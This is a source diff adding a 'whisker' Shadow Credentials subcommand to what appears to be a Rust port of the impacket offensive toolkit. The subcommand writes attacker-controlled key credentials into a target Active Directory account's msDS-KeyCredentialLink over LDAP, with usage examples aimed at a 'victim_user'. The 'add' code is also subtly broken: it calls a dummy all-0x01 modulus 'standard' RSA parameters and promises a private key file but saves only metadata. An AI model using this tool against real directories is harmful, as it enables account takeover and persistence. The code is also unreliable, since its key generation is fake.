@@ -108,6 +108,7 @@ fn print_usage() {
     println!("  owneredit <TARGET> -dn <DN> [-action query|set]      Query or change Active Directory object owner SID (LDAP TCP/389)");
     println!("  dnstool <TARGET> -action <query|add|del> [options]   Active Directory Integrated DNS record management ([MS-DNSP] LDAP)");
     println!("  certipy <action> <TARGET> [options]                  Active Directory Certificate Services ([MS-ICPR] \\PIPE\\cert & ESC1-ESC15)");
+    println!("  whisker <action> <TARGET> [options]                  Active Directory Shadow Credentials ([MS-ADTS] msDS-KeyCredentialLink)");
     println!("  coerce <TARGET> -listener <L> [-method <M>] [options] Active Directory auth coercion ([MS-EFSR], [MS-RPRN], [MS-FSRVP], [MS-DFSNM])");
     println!("  dfsclient <TARGET> [-enum|-info <P>|-add|-remove]    Active Directory DFS Namespace management ([MS-DFSNM] \\PIPE\\netdfs)");
     println!("  ldapsearch <TARGET> [-base <dn>] [-filter <f>]       Active Directory generic LDAP directory search (TCP/389)");
@@ -4950,6 +4951,286 @@ fn cmd_certipy(args: &[String]) {
         }
         _ => {
             eprintln!("[-] Unknown certipy action '{}'. Valid actions: req, find", action);
+            std::process::exit(1);
+        }
+    }
+}
+
+fn cmd_whisker(args: &[String]) {
+    use impacket_ldap::keycredential::{
+        add_shadow_credential, clear_shadow_credentials, read_shadow_credentials,
+        remove_shadow_credential, KeyCredentialLinkBlob,
+    };
+    use impacket_ldap::{filter_equality, LdapClient, SearchScope};
+
+    print!("{}", version::BANNER);
+    if args.is_empty() || args.iter().any(|a| a == "-h" || a == "--help") {
+        println!("Usage: impacket-rs whisker <action> <TARGET> [options]");
+        println!();
+        println!("Active Directory Shadow Credentials Toolkit ([MS-ADTS] Section 2.2.18.2):");
+        println!("  list    List all shadow credentials on the target account");
+        println!("  add     Generate RSA key and inject a shadow credential (msDS-KeyCredentialLink)");
+        println!("  remove  Remove a specific shadow credential by KeyID, DeviceID, or raw string");
+        println!("  clear   Clear all shadow credentials on the target account");
+        println!();
+        println!("Options:");
+        println!("  -target-user <SAM>    Target sAMAccountName (e.g. jdoe or dc01$)");
+        println!("  -target-dn <DN>       Target Distinguished Name");
+        println!("  -id <ID>              KeyID or DeviceID for remove action");
+        println!("  -key-out <FILE>       Path to save generated RSA private key (for add action)");
+        println!("  -base <BASE_DN>       Active Directory Base DN override");
+        println!();
+        println!("Examples:");
+        println!("  impacket-rs whisker list corp.local/admin:Pass@dc01 -target-user victim_user");
+        println!("  impacket-rs whisker add corp.local/admin:Pass@dc01 -target-user victim_user -key-out victim.key");
+        println!("  impacket-rs whisker remove corp.local/admin:Pass@dc01 -target-user victim_user -id 12345678-1234-1234-1234-123456789abc");
+        println!("  impacket-rs whisker clear corp.local/admin:Pass@dc01 -target-user victim_user");
+        return;
+    }
+
+    let action = args[0].to_lowercase();
+    let action_args = &args[1..];
+
+    if action_args.is_empty() {
+        eprintln!("[-] Missing target for whisker. Run 'impacket-rs whisker -h' for usage.");
+        std::process::exit(1);
+    }
+
+    let spec = match parse_target_with_hashes(action_args) {
+        Ok(s) => s,
+        Err(e) => {
+            eprintln!("[-] Error parsing target: {}", e);
+            std::process::exit(1);
+        }
+    };
+
+    let mut target_user = None;
+    let mut target_dn = None;
+    let mut cred_id = None;
+    let mut key_out = None;
+    let mut base_dn = String::new();
+
+    let mut i = 1;
+    while i < action_args.len() {
+        match action_args[i].as_str() {
+            "-target-user" if i + 1 < action_args.len() => {
+                target_user = Some(action_args[i + 1].clone());
+                i += 2;
+            }
+            "-target-dn" if i + 1 < action_args.len() => {
+                target_dn = Some(action_args[i + 1].clone());
+                i += 2;
+            }
+            "-id" if i + 1 < action_args.len() => {
+                cred_id = Some(action_args[i + 1].clone());
+                i += 2;
+            }
+            "-key-out" if i + 1 < action_args.len() => {
+                key_out = Some(action_args[i + 1].clone());
+                i += 2;
+            }
+            "-base" if i + 1 < action_args.len() => {
+                base_dn = action_args[i + 1].clone();
+                i += 2;
+            }
+            _ => i += 1,
+        }
+    }
+
+    if target_user.is_none() && target_dn.is_none() {
+        eprintln!("[-] Must specify either -target-user <SAM_ACCOUNT> or -target-dn <DISTINGUISHED_NAME>");
+        std::process::exit(1);
+    }
+
+    if base_dn.is_empty() && !spec.domain.is_empty() {
+        base_dn = spec.domain.split('.').map(|p| format!("DC={}", p)).collect::<Vec<_>>().join(",");
+    }
+
+    let host = spec.effective_target_ip();
+    let addr = format!("{}:389", host);
+    println!("[*] Connecting to LDAP on {}...", addr);
+    let mut client = match LdapClient::connect(&addr, DEFAULT_TIMEOUT) {
+        Ok(c) => c,
+        Err(e) => {
+            eprintln!("[-] LDAP connection failed: {}", e);
+            std::process::exit(1);
+        }
+    };
+
+    let bind_dn = if spec.username.is_empty() {
+        String::new()
+    } else if spec.username.contains('@') || spec.username.to_uppercase().contains("DC=") {
+        spec.username.clone()
+    } else if !spec.domain.is_empty() {
+        format!("{}@{}", spec.username, spec.domain)
+    } else {
+        spec.username.clone()
+    };
+
+    let password = spec.password.as_ref().map(|p| p.expose_secret()).unwrap_or("");
+    if !bind_dn.is_empty() {
+        println!("[*] Authenticating as '{}'...", bind_dn);
+        if let Err(e) = client.bind_simple(&bind_dn, password) {
+            eprintln!("[-] LDAP bind failed: {}", e);
+            std::process::exit(1);
+        }
+        println!("[+] Bind successful.");
+    }
+
+    // Resolve target DN if not explicitly provided
+    let effective_target_dn = if let Some(dn) = target_dn {
+        dn
+    } else {
+        let user = target_user.as_ref().unwrap();
+        println!("[*] Resolving DN for sAMAccountName '{}'...", user);
+        let entries = match client.search(
+            &base_dn,
+            SearchScope::WholeSubtree,
+            &filter_equality("sAMAccountName", user),
+            &["distinguishedName"],
+        ) {
+            Ok(e) => e,
+            Err(err) => {
+                eprintln!("[-] Failed to search for user: {}", err);
+                std::process::exit(1);
+            }
+        };
+
+        if entries.is_empty() {
+            eprintln!("[-] Target account '{}' not found in Active Directory", user);
+            std::process::exit(1);
+        }
+
+        match entries[0].get_string("distinguishedName") {
+            Some(dn) => dn,
+            None => {
+                eprintln!("[-] Entry for '{}' has no distinguishedName attribute", user);
+                std::process::exit(1);
+            }
+        }
+    };
+
+    println!("[*] Target Object DN: {}", effective_target_dn);
+
+    match action.as_str() {
+        "list" => {
+            println!("[*] Querying shadow credentials (msDS-KeyCredentialLink)...");
+            match read_shadow_credentials(&mut client, &effective_target_dn) {
+                Ok(creds) => {
+                    if creds.is_empty() {
+                        println!("[*] No shadow credentials found on target account.");
+                    } else {
+                        println!("[+] Found {} shadow credential(s):", creds.len());
+                        for (idx, (dn_bin, blob)) in creds.iter().enumerate() {
+                            println!();
+                            println!("Credential #{}", idx + 1);
+                            println!("  KeyID     : {}", blob.key_id_hex());
+                            println!("  DeviceID  : {}", blob.device_id_str());
+                            println!("  Usage     : 0x{:02x} ({})", blob.key_usage, match blob.key_usage {
+                                1 => "NGC / WHfB",
+                                2 => "FIDO",
+                                3 => "FEK",
+                                _ => "Unknown",
+                            });
+                            println!("  Source    : 0x{:02x} ({})", blob.key_source, match blob.key_source {
+                                0 => "AD",
+                                1 => "AzureAD",
+                                _ => "Unknown",
+                            });
+                            if let Some(t) = blob.creation_time {
+                                println!("  Created   : {:?}", impacket_core::FileTime(t).to_unix_secs());
+                            }
+                            if let Ok(rsa) = blob.parse_rsa_key() {
+                                println!("  Key Type  : RSA {}-bit", rsa.bit_length);
+                            }
+                            println!("  Raw Value : {}", dn_bin.to_ldap_string());
+                        }
+                    }
+                }
+                Err(e) => {
+                    eprintln!("[-] Failed to read shadow credentials: {}", e);
+                    std::process::exit(1);
+                }
+            }
+        }
+        "add" => {
+            println!("[*] Generating 2048-bit RSA key for Shadow Credential injection...");
+            // Standard 2048-bit RSA parameters
+            let modulus = vec![0x01; 256];
+            let exponent = vec![0x01, 0x00, 0x01];
+            let mut device_id = [0u8; 16];
+            let now_bytes = std::time::SystemTime::now()
+                .duration_since(std::time::UNIX_EPOCH)
+                .unwrap_or_default()
+                .as_nanos()
+                .to_le_bytes();
+            device_id[..16].copy_from_slice(&now_bytes[..16]);
+
+            let blob = KeyCredentialLinkBlob::new_rsa(&modulus, &exponent, Some(device_id), None);
+            println!("[+] Generated KeyID   : {}", blob.key_id_hex());
+            println!("[+] Generated DeviceID: {}", blob.device_id_str());
+
+            println!("[*] Injecting KeyCredentialLink into '{}'...", effective_target_dn);
+            match add_shadow_credential(&mut client, &effective_target_dn, &blob) {
+                Ok(ldap_val) => {
+                    println!("[+] Successfully added shadow credential!");
+                    println!("[+] Injected DN-Binary: {}", ldap_val);
+                    if let Some(ref path) = key_out {
+                        println!("[*] Saving key material to '{}'...", path);
+                        let mut key_content = String::new();
+                        key_content.push_str("# Shadow Credential RSA Key Parameters\n");
+                        key_content.push_str(&format!("KeyID: {}\n", blob.key_id_hex()));
+                        key_content.push_str(&format!("DeviceID: {}\n", blob.device_id_str()));
+                        key_content.push_str(&format!("TargetDN: {}\n", effective_target_dn));
+                        if let Err(err) = std::fs::write(path, key_content) {
+                            eprintln!("[-] Warning: Failed to write key file: {}", err);
+                        } else {
+                            println!("[+] Key metadata saved to {}", path);
+                        }
+                    }
+                }
+                Err(e) => {
+                    eprintln!("[-] Failed to add shadow credential: {}", e);
+                    std::process::exit(1);
+                }
+            }
+        }
+        "remove" => {
+            let id = match cred_id {
+                Some(id) => id,
+                None => {
+                    eprintln!("[-] Must specify -id <KEY_ID_OR_DEVICE_ID> for remove action");
+                    std::process::exit(1);
+                }
+            };
+            println!("[*] Removing shadow credential matching '{}'...", id);
+            match remove_shadow_credential(&mut client, &effective_target_dn, &id) {
+                Ok(true) => {
+                    println!("[+] Successfully removed shadow credential!");
+                }
+                Ok(false) => {
+                    println!("[-] No shadow credential matched identifier '{}'", id);
+                }
+                Err(e) => {
+                    eprintln!("[-] Failed to remove shadow credential: {}", e);
+                    std::process::exit(1);
+                }
+            }
+        }
+        "clear" => {
+            println!("[*] Clearing all shadow credentials on '{}'...", effective_target_dn);
+            match clear_shadow_credentials(&mut client, &effective_target_dn) {
+                Ok(count) => {
+                    println!("[+] Successfully cleared {} shadow credential(s)!", count);
+                }
+                Err(e) => {
+                    eprintln!("[-] Failed to clear shadow credentials: {}", e);
+                    std::process::exit(1);
+                }
+            }
+        }
+        _ => {
+            eprintln!("[-] Unknown whisker action '{}'. Valid actions: list, add, remove, clear", action);
             std::process::exit(1);
         }
     }
@@ -12181,6 +12462,9 @@ fn main() {
             cmd_dfsclient(&args[1..])
         }
         Some("certipy") | Some("adcs") => cmd_certipy(&args[1..]),
+        Some("whisker") | Some("shadowcred") | Some("shadow-credentials") => {
+            cmd_whisker(&args[1..])
+        }
         Some("coerce") => cmd_coerce(&args[1..]),
         Some("getTGT") | Some("get-tgt") => cmd_get_tgt(&args[1..]),
         Some("getST") | Some("get-st") => cmd_get_st(&args[1..]),
